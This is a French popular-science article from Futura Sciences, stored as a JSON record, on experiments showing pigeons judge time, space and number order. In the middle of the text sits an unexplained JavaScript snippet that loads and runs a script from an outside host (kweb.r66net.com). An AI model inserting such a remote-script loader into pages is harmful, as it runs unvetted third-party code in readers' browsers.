{"title": "Intelligence des pigeons : ils ont la notion du temps et de l'espace !", "newspaper": "Futura Sciences", "author": ["Par Futura avec l'AFP"], "date_publi": "2017-12-06", "content": "Les pigeons seraient plus intelligents qu'on ne le pensait. De nouvelles experiences revelent qu'ils font la distinction entre les concepts abstraits du temps et de l'espace, ce qui rapproche leurs capacites cognitives de celles des humains et des grands singes. Les pigeons sont capables de faire la distinction entre les concepts abstraits du temps et de l'espace, a l'instar des humains et des grands singes, selon des experiences qui revelent que ces oiseaux sont plus intelligents qu'on ne l'imaginait. << La capacite cognitive des  oiseaux  est encore plus proche de celle des humains et des grands singes >> , juge Edward Wasserman, professeur de psychologie experimentale a l'universite de l'Iowa (Etats-Unis) et principal auteur d'une etude a ce sujet publiee lundi dans  Current Biology .  << En fait, ces systemes nerveux aviaires ont beaucoup plus de capacites que ne le suggere l'expression pejorative \"avoir une cervelle d'oiseau\" >> , plaisante-t-il. \" Ces systemes nerveux aviaires ont beaucoup plus de capacites que ne le suggere l'expression pejorative << avoir une cervelle d'oiseau >>. Pour cette experience, les chercheurs ont montre a des  pigeons  une ligne horizontale statique, qui apparaissait pendant deux ou huit secondes, sur un ecran d' ordinateur . La ligne mesurait parfois six centimetres de longueur, et parfois 24. Les pigeons pouvaient choisir entre quatre symboles visuels pour indiquer si la ligne qu'ils voyaient etait longue ou courte, ou si elle apparaissait brievement ou plus longtemps. Toute bonne reponse etait recompensee par de la nourriture. Les scientifiques ont ensuite complique le test en affichant sur l'ecran la ligne, mais en variant sa taille et sa  duree  d'apparition. Et ce, de maniere aleatoire. Un pigeon cravate chinois le 21 novembre 2017 a Calbe, dans l'est de l'Allemagne. (c) Klaus-Dietmar Gabbert, dpa, AFP, archives                               Le cerveau des pigeons traite des problemes abstraits Les pigeons ont ete le plus souvent capables de determiner que les lignes qui apparaissaient plus longtemps etaient egalement les plus longues, expliquent ces chercheurs. Selon le professeur Wasserman, cela indique que les pigeons utilisent la meme region cerebrale pour jauger l'espace et le temps, ce qui laisse penser que ces concepts abstraits ne sont pas traites separement dans leur  cerveau .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des resultats similaires ont ete constates lors de tests menes avec des humains et des singes, meme si les pigeons utilisent pour leur part une autre region cerebrale. Chez les humains et les autres  primates , c'est en effet le  cortex  parietal du cerveau qui traite ces informations abstraites de l'espace et du temps. Or, les pigeons ne possedent pas de cortex parietal, et doivent donc utiliser une autre partie de leur cerveau pour distinguer ces concepts, precisent les auteurs. Les resultats de cette experience confortent l'opinion grandissante dans la communaute scientifique que d'autres  especes  animales, comme les oiseaux, les  reptiles  et les  poissons  sont capables de prendre des decisions a partir de concepts abstraits. D'autres experiences ont ainsi deja montre que les  corbeaux  sont tout aussi intelligents que les primates et fabriquent notamment des outils pour saisir leur nourriture. Pour en savoir plus Les pigeons savent faire plusieurs choses a la fois ! Article de  Nathalie Mayer  paru le 29 septembre 2017 Des pigeons multitaches ? Cela peut sembler difficile a croire. Pourtant, des chercheurs allemands affirment que ces oiseaux qui encombrent nos villes sont capables de passer tres rapidement d'une tache a une autre. Et parfois meme plus rapidement que des humains. Selon une etude realisee par des biopsychologues de l' universite de la Ruhr a Bochum  et de l'universite technique de Dresden (Allemagne), les  pigeons  seraient  multitaches . Et dans certaines situations, meme un peu plus que les humains. Le petit cerveau d'un  oiseau  serait donc suffisant a developper des capacites cognitives censement reservees aux  mammiferes . Pour arriver a cette conclusion, les chercheurs ont demande a des humains et a des pigeons d'arreter l'execution d'une tache pour passer a une autre, le plus rapidement possible. Les deux groupes ont demontre les memes capacites au vrai multitache (simultaneite des deux taches). La vitesse a laquelle les informations sont transmises dans un cerveau d'oiseau -- ici, le pigeon, a droite -- ou dans un cerveau de mammifere -- ici l'Homme, a gauche -- est la meme. Mais une densite neuronale plus elevee chez le pigeon, qui conduit a des distances entre neurones plus faibles, lui permet d'echanger les informations plus rapidement. (c) Onur Gunturkun, universite de la Ruhr a Bochum                               Pas de cortex complexe mais une densite neuronale elevee En revanche, lorsqu'un bref delai etait laisse entre l'arret d'une tache et le lancement d'une autre, les pigeons se sont montres  plus rapides  que les humains, de 250 millisecondes. Peut-etre parce que, dans le cerveau des pigeons, les signaux s'echangent plus rapidement que dans le  cerveau humain . Ou du moins, qu'ils passent d'un neurone a un autre plus rapidement. Voir aussi : Les oiseaux ont plus de neurones que les primates ! Car un cerveau de pigeon presente une densite de  neurones  six fois plus elevee qu'un cerveau humain. La distance moyenne entre deux cellules nerveuses de pigeon est 50 % plus courte qu'entre deux neurones humains. Ainsi, l'information peut-elle etre traitee plus rapidement. Et contrairement a ce que les chercheurs pensaient, les fonctions cognitives complexes n'exigeraient donc pas necessairement la presence d'un  cortex cerebral  complexe. Les pigeons peuvent ordonner les chiffres Article de Bruno Scala paru le 30/12/2011 Aussi bien que les macaques, les pigeons sont capables d'apprendre les regles numerales basiques, a savoir l'ordre des chiffres. Pourtant, on pensait cette capacite reservee aux primates. Il n'en est rien. L'expression << cervelle de moineau >> pourrait bien perdre son sens... Les pigeons savent-ils compter ? Presque... Une equipe de chercheurs de l' universite d'Otago , en Nouvelle-Zelande, vient de montrer qu'ils etaient capables de trier des ensembles en fonction du nombre d'articles qu'ils contiennent, et ce dans l'ordre croissant. Les resultats sont publies dans  Science . Jusqu'a present, seuls les primates etaient censes etre capables de ce genre d'exploit. En 1998, une etude pionniere menee par l'equipe d'Elizabeth Brannon de l' universite Columbia , avait mis en evidence la capacite de singes a  ordonner des ensembles . L'etude concluait que ces animaux avaient conscience de l'ordre numeral, jusqu'a neuf. Apprendre a ordonner En Nouvelle-Zelande, trois pigeons ont ete soumis aux memes experiences que les  macaques rhesus  il y a 12 ans. A noter que, certes, trois pigeons, c'est peu, mais c'est surtout le nombre de repetitions de ces tests qui importe. En 1998, seuls deux macaques avaient effectue les experiences et ces resultats n'ont pas ete remis en cause. Pourcentage de reussite au cours des tests pour les pigeons (violet), compare a celui des macaques pendant l'experience de 1998 (orange). Au cours de ces experiences, les animaux ont du ordonner, dans l'ordre croissant, deux lots comportant un nombre de symboles compris entre 1 et 9. Trois series d'experiences : les deux lots a ordonner sont connus des animaux (F-F) ; un seul des deux lots a ordonner est connu (F-N) ; les animaux ne sont familiers avec aucun des deux lots (N-N). (c) Scarf  et al.  2011,  Science  - adaptation Futura-Sciences                               Ces experiences se deroulaient en deux etapes. D'abord une phase de test : des lots de figures geometriques etaient presentes aux oiseaux, qui devaient donner un coup de  bec  sur chacun des lots, en commencant par celui qui contenait le moins de symboles, pour terminer avec le plus fourni. Au debut, les symboles au sein des differents lots etaient identiques, puis figures et  couleurs  variaient. Les pigeons etaient recompenses en cas de bonne reponse. Aussi bien que les macaques ! Au cours de la deuxieme phase, celle des tests, les volatiles devaient classer deux lots, comprenant 1 a 9 symboles. Soit il s'agissait de lots ou de figures qu'ils avaient deja vus au cours de la phase d'entrainement (F-F sur le graphique), soit de figures dont ils n'etaient pas familiers (N-N). Ou bien un melange (F-N). Resultats, ils ont fait presqu'aussi bien que les primates, ce qui est plutot surprenant. Ces tests indiquent que les prouesses des oiseaux sont statistiquement differentes de coups de chance a repetition. Les scientifiques en ont donc conclu que les pigeons sont capables d' apprendre  les regles numerales basiques. C'est effectivement d' apprentissage  qu'il s'agit puisqu'avant de passer les tests, ces oiseaux ont ete entraines pendant une annee. Bien sur, ils ne semblent pas encore aussi forts que les primates en calcul mental. En 2007, l'equipe d'Elizabeth Brannon avait egalement montre que les macaques etaient capables de  realiser des additions . Les pigeons n'en sont pas la. Et s'ils y parvenaient, peut-etre realiseraient-ils qu'ils sont trop nombreux... Ce qu'il faut retenir Les pigeons comprennent les concepts abstraits de temps et d'espace comme les humains. Ils n'utilisent pas les memes zones cerebrales que l'Homme pour traiter ces concepts. D'autres travaux ont montre que les corbeaux sont particulierement intelligents. Cela vous interessera aussi Intelligence animale : un bourdon apprend a tirer une ficelle !                       Pour les scientifiques, ces images sont surprenantes. Des bourdons ont pu apprendre une technique complexe : tirer sur une corde pour attraper de la nourriture autrement inaccessible (un liquide sucre). Jusque-la, seuls des oiseaux et quelques mammiferes etaient censes avoir cette capacite. Mieux, ce savoir-faire a ete transmis a d'autres bourdons, qui ont observe leurs congeneres savants. L'apprentissage, par un individu et au sein d'un groupe, est donc bien plus repandu dans le monde animal qu'on ne l'imaginait.                                       ", "theme": "planete"}